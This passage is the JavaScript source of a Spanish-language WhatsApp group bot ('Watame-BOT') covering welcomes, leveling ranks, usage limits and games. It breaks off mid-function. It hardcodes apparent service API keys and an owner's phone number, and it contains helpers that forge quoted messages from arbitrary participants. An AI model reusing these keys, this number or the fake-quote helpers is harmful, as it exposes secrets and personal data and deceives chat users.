//WATAME-BOT


const {
    WAConnection,
  MessageType,
  Presence, 
  MessageOptions,
  Mimetype,
  WALocationMessage,
  WA_MESSAGE_STUB_TYPES,
  ReconnectMode,
  ProxyAgent,
  GroupSettingChange,
  ChatModification,
  waChatKey,
  WA_DEFAULT_EPHEMERAL,
  mentionedJid,
  processTime
} = require('@adiwajshing/baileys')
const fs = require('fs')
const axios = require("axios")
const speed = require('performance-now')
const request = require('request')
const ms = require('parse-ms')
const moment = require('moment-timezone')
const fetch = require('node-fetch')
const ffmpeg = require('fluent-ffmpeg')
const imageToBase64 = require('image-to-base64')
const lolis = require('lolis.life')
const loli = new lolis()
const chalk = require('chalk');
const { removeBackgroundFromImageFile } = require('remove.bg')
const { color, bgcolor } = require('./lib/color')
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { fetchJson, fetchText } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const { exec } = require('child_process')
const { addMetadata } = require('./lib/exif.js')
const Exif = require('./exif.js')
const exif = new Exif()
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const trava = JSON.parse(fs.readFileSync('./src/trava.json'))
const samih = JSON.parse(fs.readFileSync('./src/simi.json'))
const setting = JSON.parse(fs.readFileSync('./src/settings.json'))
const setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
const audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
const { nsfwmenu } = require('./src/nsfwmenu')
const { idiomas } = require('./src/idiomas')
const { isFiltered, addFilter } = require('./lib/antispam')
const imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
const videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const user2 = JSON.parse(fs.readFileSync('./database/json/user2.json'))
const ban = JSON.parse(fs.readFileSync('./database/json/banned.json'))
const { ind } = require('./language')
const _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
const _registered = JSON.parse(fs.readFileSync('./database/bot/registered.json'))
const event = JSON.parse(fs.readFileSync('./database/bot/event.json'))
const _limit = JSON.parse(fs.readFileSync('./database/user/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const settingan = JSON.parse(fs.readFileSync('./admin/set.json'))
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const {
	limitawal,
	memberlimit,
	cr,
	BotPrefix,
	author,
	pack
} = settingan

const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}


ConfuMods = [`51931655706@s.whatsapp.net`] 
prefix = '#'
hardi = 'hardianto'
blocked = []
fake = '🌸Watame-BOT🌸'
fakeimage = fs.readFileSync(`./media/confu.jpeg`)
numbernye = '10'
public = true
const vcard = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + 'FN:🔰Manuel🔰\n' 
            + 'ORG:🌸Watame-BOT🌸;\n' 
            + 'TEL;type=CELL;type=VOICE;waid=51931655706:+51931655706\n' 
            + 'END:VCARD' 

ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]


const {
	getLevelingXp,
	getLevelingLevel,
	getLevelingId,
	addLevelingXp,
	addLevelingLevel,
	addLevelingId
} = require('./lib/level.js')


const {
	getRegisteredRandomId,
	addRegisteredUser,    
	createSerial,
	checkRegisteredUser,
    bannadd,
    checkban
    
} = require('./lib/register.js')

               const addRegisteredUser2 = (userid, sender) => {
            const obj = { id: userid, name: sender }
            user2.push(sender)		
            fs.writeFileSync('./database/json/user2.json', JSON.stringify(_registered))
        } 			           
/*[-> ATM & Limit <-]*/
const {
	addATM,
	addKoinUser,
	checkATMuser,
	bayarLimit,
	confirmATM,
	addwaifu,
	limitAdd
} = require('./lib/limitatm.js')




const BarBarKey = 'IDxO1TFYnKADlX4pxcHa'
const VhtearKey = '1BlnApiIkyPake'
const XteamKey = 'd39b4b3fc7dba'
const TobzApi = 'Bidmzz1sJ2L1TKyqaMEU'
const ZeksApi = '🌸Watame-BOT🌸'
const LolKey = 'save123'
lolkey = 'Asyapikeycanz'
function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Horas ${pad(minutes)} Minutos ${pad(seconds)} Segundos`
}
function tanggal(){
myMonths = ["Enero","Febrero","marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Deciembre"];
			myDays = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
			var tgl = new Date();
			var day = tgl.getDate()
			bulan = tgl.getMonth()
			var thisDay = tgl.getDay(),
			thisDay = myDays[thisDay];
			var yy = tgl.getYear()
			var year = (yy < 1000) ? yy + 1900 : yy;
			return `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
}

function monospace(string) {
return '```' + string + '```'
}


async function starts() {
	const cnf = new WAConnection()
	cnf.version = [2, 2143, 3]
	cnf.logger.level = 'warn'
	console.log(banner.string)
	cnf.on('qr', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Escanea el Qr'))
	})

	fs.existsSync('./cnf.json') && cnf.loadAuthInfo('./cnf.json')
	cnf.on('connecting', () => {
		start('2', 'Cargando UwU')
	})
	cnf.on('open', () => {
		success('2', 'Listo 7u7')
	})
	await cnf.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./cnf.json', JSON.stringify(cnf.base64EncodedAuthInfo(), null, '\t'))



cnf.on('CB:action,,call', async json => {
    const callerId = json[2][0][1].from;
    console.log("call dari "+ callerId)
        cnf.sendMessage(callerId, "Sistema de bloqueo automático, nada de llamadas! (・–・;)ゞ", MessageType.text)
        await sleep(4000)
        await cnf.blockUser(callerId, "add") 
})
	cnf.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})
	
cnf.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await cnf.groupMetadata(anu.jid)
		
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				try {
					ppimg = await cnf.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i.ibb.co/Rgn07Kt/20210702-082122.jpg'
				}
				teks = `❤️¡Bienvenid@ al grupo!❤️

══════════ ◖◍◗
     
Hola! •🌸• @${num.split('@')[0]}

══════════ ◖◍◗


Es grato para nosotros darte la bienvenida y agradecerte por preferir ser parte de esta comunidad, puedes comunicar de cualquier duda a los administradores, disfruta de tu estadía en el grupo 😸❤️



🌸⊳ Por favor, lee las reglas para evitar conflictos 😊

🌸⊳ Entra a la descripción del grupo para informate ✅

🌸⊳Puedes interactuar conmigo tanto por interno como de forma grupal usando *#menu*💠`
				let buff = await getBuffer(ppimg)
				cnf.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
				}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
})
	

	cnf.on('chat-update', async (mek) => {
		try {
            if (!mek.hasNewMessage) return
            mek = mek.messages.all()[0]
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		//if (!mek.key.fromMe) return
		global.prefix
			global.blocked
			mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message 
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const apiKey = setting.apiKey 
			const { text, extendedText, contact, caption, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
			const date = new Date().toLocaleDateString()
			const jam = moment.tz('Asia/Jakarta').format('HH:mm')
      const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
      const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
        
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
				const command = body.trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)
			chats = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const arg = chats.slice(command.length + 2, chats.length)
			
			

			mess = {
				wait: 'En corto te doy tu pedido, espera',
				nsfwoff: 'LA FUNCION NSFW NO ESTÁ ACTIVA! 🚫',
				success: '¡Listo!',
				wrongFormat: 'Escribe Bien 🙂',
				waitmusic: 'Espera, Estoy buscando tu música!',
				waitimg: 'Espera, lo ago lo mas rapido que puedo',
				banned: 'Lo siento, ya no puedes utilizarme por ordenes de mi creador',
				musica: 'Espera un momento, estoy buscando tu musica',
			imageoff: 'No tengo permitido enviar fotos',
				error: {
					stick: 'Error',
				errostick: 'Error',
				Iv: 'Tu link enlace no funciona al parecer'
				},
				only: {
					group: 'ESTE COMANDO SOLO PUEDE SER USADO EN GRUPOS',
					ownerG: 'Este Comando Solo Puede Ser Usado Por El Dueño Del Grupo',
					ownerB: 'Este comando solo lo puede utilizar mi creador, tu no (・–・;)ゞ',
					admin: 'No eres admin 😸',
					Badmin: 'Sin permisos 😟'
				}
			}



				
			
			const botNumber = cnf.user.jid			
			const isGroup = from.endsWith('@g.us')
			const tescuk = ["0@s.whatsapp.net"]
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			const groupMetadata = isGroup ? await cnf.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
            const isAntilink = isGroup ? antilink.includes(from) : false
            const senderme = mek.participant
			const itsMe = sender == botNumber ? true : false
			const isWelkom = isGroup ? welkom.includes(from) : false
		    const isUser2 = user2.includes(sender)
			const isAntiLink = isGroup ? antilink.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isTrava = isGroup ? trava.includes(from) : false
				    const senderNumber = sender.split("@")[0]
const groupDesc = isGroup ? groupMetadata.desc : ''
			const totalchat = await cnf.chats.all()			
	 	const isEventon = isGroup ? event.includes(from) : false
            const isRegistered = checkRegisteredUser(sender)
            			const isBanned = ban.includes(sender)
            const isLevelingOn = isGroup ? _leveling.includes(from) : false						
			const isSimi = isGroup ? samih.includes(from) : false
			const isOwner = ConfuMods.includes(sender)
			const button = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
			const isMe = botNumber.includes(senderme)
			let pushname = cnf.contacts[sender] != undefined ? cnf.contacts[sender].vname || cnf.contacts[sender].notify: undefined
			const q = args.join(' ')
			let infoMSG = JSON.parse(fs.readFileSync('./src/msg.data.json'))
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				cnf.sendMessage(from, teks, text, {quoted: mek})
			}
			const sendMess = (hehe, teks) => {
				cnf.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? cnf.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : cnf.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}
					    const costum = (pesan, tipe, target, target2) => {
			cnf.sendMessage(from, pesan, tipe, { contextInfo: { forwardingScore: 400, isForwarded: true } , quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) },message: { conversation: `${target2}` }}})
			}
			const costumimg = ( pesan , tipe, target , caption) => {
			cnf.sendMessage(from, pesan , tipe , {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: {"imageMessage":{url: 'https://mmg.whatsapp.net/d/f/Ahj0ACnTjSHHm6-HjqAUBYiCu2-85zMZp_-EhiXlsd6A.enc',mimetype: 'image/jpeg',caption: `${caption}`,fileSha256: '0Pk0qJyQFn9FCtslZrydJHRQDKryjYcdP7I3CmRrHRs=',fileLength: '20696',height: 360,width: 382,mediaKey: 'N43d/3GY7GYQpgBymb9qFY5O9iNDXuBirXsNZk+X61I=',fileEncSha256: 'IdFM58vy8URV+IUmOqAY3OZsvCN6Px8gaJlRCElqhd4=',directPath: '/v/t62.7118-24/35174026_475909656741093_8174708112574209693_n.enc?oh=2a690b130cf8f912a9ca35f366558743&oe=6061F0C6',mediaKeyTimestamp: '1614240917',jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMASAMBIgACEQEDEQH/xAAwAAADAAMBAAAAAAAAAAAAAAAABAUBAwYCAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAoy6kcWS2eH8miq17B553Thh1BgyTY9iULYfndGBmbSwNEV3eWXpjwZElG09WJckXCj8sWBVc1ZKXj2ZYaoWHnc67K3PbKwtZOqzLrzdQAg5fWFRUeCNTQG2pEKJ0wCD/xAAoEAACAgIBAQkAAwEAAAAAAAABAgADBBEScQUQEyEiMTJBYSNRYmP/2gAIAQEAAT8AaZzfEdwWcGMTE1jNv3M1ozDb+SD2jTO+Yigk6A3KqhseIdfkroTYbXQRrkVuJOplKEuOpjtpxF+IjTO+YnZoBvj4pa/msHtMnHZrgymZ6hCnSJsDl+ys7rTpGmevxMwLFS/1fcA7iNzPsDXaH1NccYH+2lJ1SnSNMlOdcbY6iYGa9g4OJzXW9zI7SBJrpjqxsA9zMkcMetf2V7NKD/McgAkxsis7EcA2fkxkqSkaYbMGRu3hr0x6q6ckufaUMpsexj0ma4Y0qDKhqlektyntXiQO4qWI0PONVZWNsNTmZwewekEwo1fpYaMZdvWf2DYrXoO/ARWLNL6VuXiYcSsuK9eXGYtHhM/nsTPVQgb7iDkydRCNBYYx1Ozj6nmSStRIgJ8UH/nMJiTZs/c7RPwExhu+vrH+p//EAB4RAAIBBAMBAAAAAAAAAAAAAAABAhAREjIhMDFC/9oACAECAQE/AOpJsxEqIj4TfNqXygIWpLc+ZEdBH//EAB4RAAICAgIDAAAAAAAAAAAAAAABAjEQETJBAxJx/9oACAEDAQE/AHWVeHQtYrDaNkno7GOzxP10xzWipDHZHidx+EuQz//Z',scansSidecar: 'choizTOCOFXo21QcOR/IlCehTFztHGnB3xo4F4d/kwmxSJJIbMmvxg==',scanLengths: [Array],midQualityFileSha256: '68OHK4IyhiKDNgNAZ3SoXsngzYENebQkV4b/RwhhYIY=',midQualityFileEncSha256: '2EYOLCXx+aqg9RyP6xJYChQNbEjXZmc0EcSwHzoyXx0='}}}})
			}
			

			
			

 		idttt = []
	    players1 = []
	    players11 = []
	    players2 = []
	    gilir = []
	    gilirr = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players11.push(t.player11)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
	    gilirr.push(t.gilirr)
	    }
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
isPlayer11 = isGroup ? players11.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
		try {
		pporang = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		      
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    cnf.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 									
			 	           /*[-- funcion dinero --]*/
 	           if (isRegistered ) {
 	           const checkATM = checkATMuser(sender)	     
	        }
			/*[-- funcion barra de nivel --]*/
			var per = '*[▒▒▒▒▒▒▒▒▒▒] 0%*'
			const peri = 50 * (Math.pow(2, getLevelingLevel(sender)) - 1)
			const perl = peri-getLevelingXp(sender) 
			const resl = Math.round(100-((perl/getLevelingXp(sender))*100))
			if (resl <= 10) {
				per = `*[█▒▒▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 20) {
				per = `*[██▒▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 30) {
				per = `*[███▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 40) {
				per = `*[████▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 50) {
				per = `*[█████▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 60) {
				per = `*[██████▒▒▒▒] ${resl}%*`
			} else if (resl <= 70) {
				per = `*[███████▒▒▒] ${resl}%*`
			} else if (resl <= 80) {
				per = `*[████████▒▒] ${resl}%*`
			} else if (resl <= 90) {
				per = `*[█████████▒] ${resl}%*`
			} else if (resl <= 100) {
				per = `*[██████████] ${resl}%*`
			} 
				
					
			
			/*[-- funcion ranking --]*/
			const levelRole = getLevelingLevel(sender)
   	       var role = 'Dicipulo'
        if (levelRole <= 2) {
            role = 'Dicipulo'
        } else if (levelRole <= 4) {
            role = 'Dicipulo Dia 1 ⚊¹'
        } else if (levelRole <= 6) {
            role = 'Dicipulo Dia 2 ⚊²'
        } else if (levelRole <= 8) {
            role = 'Dicipulo Dia 3 ⚊³'
        } else if (levelRole <= 10) {
            role = 'Dicipulo Dia 4 ⚊⁴'
        } else if (levelRole <= 12) {
            role = 'Avanzado mes 1 ⚌¹'
        } else if (levelRole <= 14) {
            role = 'Avanzado mes 2 ⚌²'
        } else if (levelRole <= 16) {
            role = 'Avanzado mes 3 ⚌³'
        } else if (levelRole <= 18) {
            role = 'Avanzado mes 4 ⚌⁴'
        } else if (levelRole <= 20) {
            role = 'Avanzado mes 5 ⚌⁵'
        } else if (levelRole <= 22) {
            role = 'Aventurero nv dia 1 ☰¹'
        } else if (levelRole <= 24) {
            role = 'Aventurero nv dia 2 ☰²'
        } else if (levelRole <= 26) {
            role = 'Aventurero nv dia 3 ☰³'
        } else if (levelRole <= 28) {
            role = 'Aventurero nv dia 4 ☰⁴'
        } else if (levelRole <= 30) {
            role = 'Aventurero nv dia 5 ☰⁵'
        } else if (levelRole <= 32) {
            role = 'Aventurero exp año 1 ≣¹'
        } else if (levelRole <= 34) {
            role = 'Aventurero exp año 2 ≣²'
        } else if (levelRole <= 36) {
            role = 'Aventurero exp año 3 ≣³'
        } else if (levelRole <= 38) {
            role = 'Aventurero exp año 4 ≣⁴'
        } else if (levelRole <= 40) {
            role = 'Aventurero exp año 5 ≣⁵'
        } else if (levelRole <= 42) {
            role = 'Aventurero prf año 1 ﹀¹'
        } else if (levelRole <= 44) {
            role = 'Aventurero prf año 2 ﹀²'
        } else if (levelRole <= 46) {
            role = 'Aventurero prf año 3 ﹀³'
        } else if (levelRole <= 48) {
            role = 'Aventurero prf año 4 ﹀⁴'
        } else if (levelRole <= 50) {
            role = 'Aventurero prf año 5 ﹀⁵'
        } else if (levelRole <= 52) {
            role = 'Maestro mes 1 ︾¹'
        } else if (levelRole <= 54) {
            role = 'Maestro mes 2 ︾²'
        } else if (levelRole <= 56) {
            role = 'Maestro mes 3 ︾³'
        } else if (levelRole <= 58) {
            role = 'Maestro mes 4 ︾⁴'
        } else if (levelRole <= 60) {
            role = 'Maestro mes 5 ︾⁵'
        } else if (levelRole <= 62) {
            role = 'Elite mes 1 ♢¹ '
        } else if (levelRole <= 64) {
            role = 'Elite mes 2 ♢²'
        } else if (levelRole <= 66) {
            role = 'Elite mes 3 ♢³'
        } else if (levelRole <= 68) {
            role = 'Elite mes 4 ♢⁴'
        } else if (levelRole <= 70) {
            role = 'Elite mes 5 ♢⁵'
        } else if (levelRole <= 72) {
            role = 'Elite año 1 ♢♢¹'
        } else if (levelRole <= 74) {
            role = 'Elite año 2 ♢♢²'
        } else if (levelRole <= 76) {
            role = 'Elite año 3 ♢♢³'
        } else if (levelRole <= 78) {
            role = 'Elite año 4 ♢♢⁴'
        } else if (levelRole <= 80) {
            role = 'Elite año 5 ♢♢⁵'
        } else if (levelRole <= 82) {
            role = 'Elite de la elite dia 1 ✷¹'
        } else if (levelRole <= 84) {
            role = 'Elite de la elite dia 2 ✷²'
        } else if (levelRole <= 86) {
            role = 'Elite de la elite dia 3 ✷³'
        } else if (levelRole <= 88) {
            role = 'Elite de la elite dia 4 ✷⁴'
        } else if (levelRole <= 90) {
            role = 'Elite de la elite dia 5 ✷⁵'
        } else if (levelRole <= 92) {
            role = 'Escolta dia 1 ✷✷¹'
        } else if (levelRole <= 94) {
            role = 'Escolta dia 2 ✷✷²'
        } else if (levelRole <= 96) {
            role = 'Escolta dia 3 ✷✷³'
        } else if (levelRole <= 98) {
            role = 'Escolta dia 4 ✷✷⁴'
        } else if (levelRole <= 100) {
            role = 'Escolta dia 5 ✷✷⁵'
        } else if (levelRole <= 102) {                   
            role = 'Leyenda I 忍'
        } else if (levelRole <= 154) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 156) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 158) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 160) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 162) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 164) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 166) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 168) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 170) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 172) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 174) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 176) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 178) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 180) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 182) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 184) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 186) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 188) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 190) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 192) {
            role = 'Leyenda I 忍'
        } else if (levelRole <= 194) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 196) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 198) {
            role = 'Leyenda II 忍'
        } else if (levelRole <= 200) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 210) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 220) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 230) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 240) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 250) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 260) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 270) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 280) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 290) {
            role = 'Leyenda III 忍'
        } else if (levelRole <= 300) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 310) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 320) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 330) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 340) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 350) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 360) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 370) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 380) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 390) {
            role = 'Leyenda IV 忍'
        } else if (levelRole <= 400) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 410) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 420) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 430) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 440) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 450) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 460) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 470) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 480) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 490) {
            role = 'Leyenda V 忍'
        } else if (levelRole <= 500) {
            role = 'Leyenda VI 忍'
        } else if (levelRole <= 666) {
            role = 'Leyenda VII 忍'
        } else if (levelRole <= 700) {
            role = 'Leyenda VIII 忍'
        } else if (levelRole <= 800) {
            role = 'Leyenda IX 忍'
        } else if (levelRole <= 900) {
            role = 'Leyenda X 忍'
        } else if (levelRole <= 1000) {
            role = 'Mythic I 上帝'
        } else if (levelRole <= 2000) {
            role = 'Mythic II 上帝'
        } else if (levelRole <= 3000) {
            role = 'Mythic III 上帝'
        } else if (levelRole <= 4000) {
            role = 'Mythic IV 上帝'
        } else if (levelRole <= 5000) {
            role = 'Mythic V 上帝'
        } else if (levelRole <= 6000) {
            role = 'Mythical Glory 上帝'
        } else if (levelRole <= 7000) {
            role = 'Mythical Glory x1000帝'
        } else if (levelRole <= 8000) {
            role = 'Mythical Glory 1100 上帝'
        } else if (levelRole <= 9000) {
            role = 'Mythical Glory 2000 上帝'
        } else if (levelRole <= 10000) {
            role = 'Despertar 特尔邦贡'
	    } else if (levelRole <= 66666666) {
   	         role = 'Onichan❗'
   	     }
   		 
				
				
	        /*[-- funcion nivel --]*/
            if (isGroup && isRegistered && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 500
                const requiredXp = 500 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    bayarLimit(sender, 3)
                     addKoinUser(sender, 20)     	           	                
                     await reply(ind.levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role))            
	               
 
                  }
            } catch (err) {
                console.error(err)
            }
        }
         

          /*[-- function check limit --]*/
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return cnf.sendMessage(from,`Su límite de solicitudes ha expirado`, text,{ quoted: mek})
                            cnf.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
                        cnf.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				} 
		
			/*[-- limit end --]*/
            const isLimit = (sender) =>{ 
          	if (isOwner ) {return false;}
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    cnf.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/user/limit.json',JSON.stringify(_limit))
           return false
     	  }
     	}
     	   
     	   /*[-- auto out form gc if member under limit --]*/
 	       if (isGroup) {
				try {
					const getmemex = groupMembers.length	
				    if (getmemex <= memberlimit) {
					reply(`lo siento, los miembros del grupo no han cumplido con los requisitos. miembros mínimos deben ser ${memberlimit}`)					
 	                           cnf.groupLeave(from) 			  
							cnf.updatePresence(from, Presence.composing)						
				    }
